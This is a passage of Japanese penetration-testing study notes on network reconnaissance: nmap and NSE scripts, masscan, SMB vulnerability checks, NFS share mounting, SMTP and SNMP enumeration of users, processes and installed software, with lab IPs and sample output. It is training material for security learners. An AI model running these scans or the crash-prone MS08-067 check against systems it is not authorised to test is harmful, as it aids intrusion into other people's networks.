OS CPE: cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7
OS details: Microsoft Windows 7 or Windows Server 2008 R2
Network Distance: 1 hop
```

#### サービス列挙
オプション-sVを使用することで特定のポートで動作しているサービスを識別することができる。
```
kali@kali:~$ nmap -sV -sT -A 10.11.1.220
```


#### Nmap Scripting Engine(NSE)
ユーザが作成したスクリプトを起動し、さまざまなスキャン作業を自動化することができる。
例)DNSの列挙、ブルートフォース攻撃、脆弱性の特定など  
NSEスクリプトは/usr/share/nmap/scriptsディレクトリに配置されている

```
kali@kali:~$ nmap 10.11.1.220 --script=smb-os-discovery
...
OS: Windows Server 2008 R2 Standard 7601 Service Pack 1 (Windows Server 2008 R2 Sta
| OS CPE: cpe:/o:microsoft:windows_server_2008::sp1
| Computer name: master
| NetBIOS computer name: MASTER\x00
| Domain name: thinc.local
| Forest name: thinc.local
| FQDN: master.thinc.local
|_ System time: 2013-12-27T23:37:58-08:00
Nmap done: 1 IP address (1 host up) scanned in 5.85 seconds
```

```
kali@kali:~$ nmap --script=dns-zone-transfer -p 53 ns2.megacorpone.com
Starting Nmap 7.70 ( https://nmap.org ) at 2019-03-04 11:54 EST
Nmap scan report for ns2.megacorpone.com (38.100.193.80)
Host is up (0.010s latency).
Other addresses for ns2.megacorpone.com (not scanned):
PORT STATE SERVICE
53/tcp open domain
| dns-zone-transfer:
| megacorpone.com. SOA ns1.megacorpone.com. admin.megacorpone.com.
| megacorpone.com. MX 10 fb.mail.gandi.net.
| megacorpone.com. MX 20 spool.mail.gandi.net.
| megacorpone.com. MX 50 mail.megacorpone.com.
| megacorpone.com. MX 60 mail2.megacorpone.com.
| megacorpone.com. NS ns1.megacorpone.com.
...
```

#### Nmapオプション:
- -sS...ステルス/SYNスキャン
- -sT...TCPコネクトスキャン
- -sU...UDPスキャン
- -sn...ネットワークスイープ
- -A...OSのバージョン検出
- -sC...--script=defaultの意味
- -sV...特定のポートで動作しているサービスを識別
- --script=...様々なスクリプトの使用
  - dns-zone-transfer
  - smb-os-discovery
  - http-enum
  - vuln
- -O...OSフィンガープリンティング(ターゲットのOS判別)
- -v...詳細の出力
- -oG...grep可能なファイル形式に出力
- --top-ports...優先度の高い順にポートを検出(/usr/share/nmap/nmap-servicesに依存)

### Masscan
Massscanはインターネット全体を約6分でスキャンし、1秒間に1000万パケットという驚異的な数のパケットを送信する最速のポートスキャナー。  
raw socketsの権限を必要とするためsudoを用いる。　　
下記のコマンドではTCPポート80が空いているホストをclass Aサブネットで列挙している。
```
kali@kali:~$ sudo masscan -p80 10.0.0.0/8
```

## SMB
### NetBIOSのスキャン
NetBIOSはローカルネットワーク上のコンピュータが相互に通信できるようにするセッション層のプロトコルである。  
最近のSMBの実装ではNetBIOSがなくても動作するが、NetBIOS over TCP(NBT)は後方互換性のために必要で、ともに有効になっている場合が多い。このt前、2つのサービスの列挙は一緒に行われる。
```
kali@kali:~$ nmap -v -p 139,445 -oG result.txt 10.10.10.1
```
#### nbtscan
NetBIOS情報を特定するための専門的ツール。オプション-rを使用することで発信元のUDPポートを137に指定している。
```
kali@kali:~$ sudo nbtscan -r 10.11.1.0/24
```

### Nmap NSE ScriptsによるSMBの列挙
Nmap NES Scriptsのディレクトリ(SMB):
```
/usr/share/nmap/scripts
```
SMBによるOSの検出や列挙(smb-os-discovery):
```
kali@kali:~$ nmap -v -p 139, 445 --script=smb-os-discovery 10.11.1.227
```
SMBプロトコルの既知の脆弱性をチェックする場合:  
(unsafe=1にした場合、脆弱なシステムをクラッシュさせてしまう可能性があるので、本番システムをスキャンする場合は注意)
```
kali@kali:~$ nmap -v -p 139,445 --script=smb-vuln-ms08-067 --script-args=unsafe=1 10.10.10.1
```
## NFS
Network File System(NFS)はクライアントコンピュータのユーザがあたかもローカルにマウントされたストレージ上にあるかのようにファイルにアクセスすることを可能にする。  
NFSはUNIX系OSで使用されることが多く、その実装は安全ではない。  
NFSで使用されるPortmapperとRPCbindはともにTCPポート111で動作する。
```
kali@kali:~$ nmap -v -p 111 10.10.10.1
```
```
kali@kali:~$ nmap -sV -p 111 --script=rpcinfo 10.10.10.1
```

NFSが動作していることが分かった場合/usr/share/nmap/scriptsにあるNSEスクリプトを使用して、サービスの列挙や追加サービスの発見を行うことができる。「*」を使用することで、まとめて使用することができる。
```
kali@kali:~$ ls -1 /usr/share/nmap/scripts/nfs*
/usr/share/nmap/scripts/nfs-ls.nse
/usr/share/nmap/scripts/nfs-showmount.nse
/usr/share/nmap/scripts/nfs-statfs.nse

kali@kali:~$ nmap -p 111 --script nfs* 10.11.1.72
```

### NFSのマウント
mountコマンドを使用することでファイルのアクセスできるようになる。  
オプション-o nolockでファイルロックを無効にする。
```
kali@kali:~$ mkdir test
kali@kali:~$ sudo mount -o nolock 10.11.1.72:/home ~/test/
kali@kali:~$ cd test/ && ls
jenny joe45 john marcus ryuu
```

## SMTP(25)
```
nc -vn 10.10.10.1 25
```
```
nmap -p 25 --script smtp-commands 10.10.10.10
```
|  コマンド  |  動作  |
| ---- | ---- |
|  VERY  |  サーバに電子メールアドレスの確認を要求　 |
|  EXPN  |  サーバにメーリングリストの資格を要求  |


## SNMP(161)
SNMPはルータ、スイッチ、サーバなどのTCP/IPネットワークに接続された通信機器に対して、ネットワーク経由で監視、制御するためのUDPベースのアプリケーション層プロトコル。  
SNMP1,2,2cではトラフィックの暗号化が行われていないため、SNMP情報や認証情報をローカルネットワーク上で傍受することができてしまう。  
MIBはネットワーク管理に関連する情報を含むデータベースのことでツリー上になっている。
その下にSNMPコミュニティと呼ばれるSNMPで管理するネットワークシステムの範囲を定めたものがある。
```
kali@kali:~$ sudo nmap -sU --open -p 161 10.11.1.1-254 -oG open-snmp.txt
```

### Windows SNMPの列挙
#### MIBツリーの列挙
```
kali@kali:~$ snmpwalk -c public -v1 -t 10 10.10.10.1
iso.3.6.1.2.1.1.1.0 = STRING: "Hardware: x86 Family 6 Model 12 Stepping 2 AT/AT COMPAT
IBLE - Software: Windows 2000 Version 5.1 (Build 2600 Uniprocessor Free)"
iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.311.1.1.3.1.1
iso.3.6.1.2.1.1.3.0 = Timeticks: (2005539644) 232 days, 2:56:36.44
iso.3.6.1.2.1.1.4.0 = ""
```
- -c...コミュニティ文字列を指定
- -v...SNMPバージョン番号の指定
- -t...タイムアウト期間の設定

#### Windowsユーザーの列挙
```
kali@kali:~$ snmpwalk -c public -v1 10.10.10.1 1.3.6.1.4.1.77.1.2.25
iso.3.6.1.4.1.77.1.2.25.1.1.3.98.111.98 = STRING: "bob"
iso.3.6.1.4.1.77.1.2.25.1.1.5.71.117.101.115.116 = STRING: "Guest"
iso.3.6.1.4.1.77.1.2.25.1.1.8.73.85.83.82.95.66.79.66 = STRING: "IUSR_BOB"
```

#### 実行中のWindowsプロセス列挙n
```
kali@kali:~$ snmpwalk -c public -v1 10.10.10.1 1.3.6.1.2.1.25.4.2.1.2
iso.3.6.1.2.1.25.4.2.1.2.1 = STRING: "System Idle Process"
iso.3.6.1.2.1.25.4.2.1.2.4 = STRING: "System"
iso.3.6.1.2.1.25.4.2.1.2.224 = STRING: "smss.exe"
iso.3.6.1.2.1.25.4.2.1.2.324 = STRING: "csrss.exe"
iso.3.6.1.2.1.25.4.2.1.2.364 = STRING: "wininit.exe"
iso.3.6.1.2.1.25.4.2.1.2.372 = STRING: "csrss.exe"
iso.3.6.1.2.1.25.4.2.1.2.420 = STRING: "winlogon.exe"
```

#### TCPポートの列挙
```
kali@kali:~$ snmpwalk -c public -v1 10.11.1.14 1.3.6.1.2.1.6.13.1.3
iso.3.6.1.2.1.6.13.1.3.0.0.0.0.21.0.0.0.0.18646 = INTEGER: 21
iso.3.6.1.2.1.6.13.1.3.0.0.0.0.80.0.0.0.0.45310 = INTEGER: 80
iso.3.6.1.2.1.6.13.1.3.0.0.0.0.135.0.0.0.0.24806 = INTEGER: 135
iso.3.6.1.2.1.6.13.1.3.0.0.0.0.443.0.0.0.0.45070 = INTEGER: 443
```

#### インストールされているソフトウェアの列挙
```
kali@kali:~$ snmpwalk -c public -v1 10.11.1.50 1.3.6.1.2.1.25.6.3.1.2
iso.3.6.1.2.1.25.6.3.1.2.1 = STRING: "LiveUpdate 3.3 (Symantec Corporation)"
iso.3.6.1.2.1.25.6.3.1.2.2 = STRING: "WampServer 2.5"
iso.3.6.1.2.1.25.6.3.1.2.3 = STRING: "VMware Tools"
iso.3.6.1.2.1.25.6.3.1.2.4 = STRING: "Microsoft Visual C++ 2008 Redistributable - x86
9.0.30729.4148"
iso.3.6.1.2.1.25.6.3.1.2.5 = STRING: "Microsoft Visual C++ 2012 Redistributable (x86)
```

# 脆弱性スキャン
Nessusの使い方
```
sudo nmap --script vuln 10.10.10.1
```

# Webアプリケーションに対する攻撃(HTTP/HTTPS)
悪用をする前に、Webアプリケーションを構成するコンポーネントを特定することが重要。
- プログラミング言語とフレームワーク
- Webサーバソフトウェア
- データベースソフトウェア
- サーバーのオペレーティングシステム



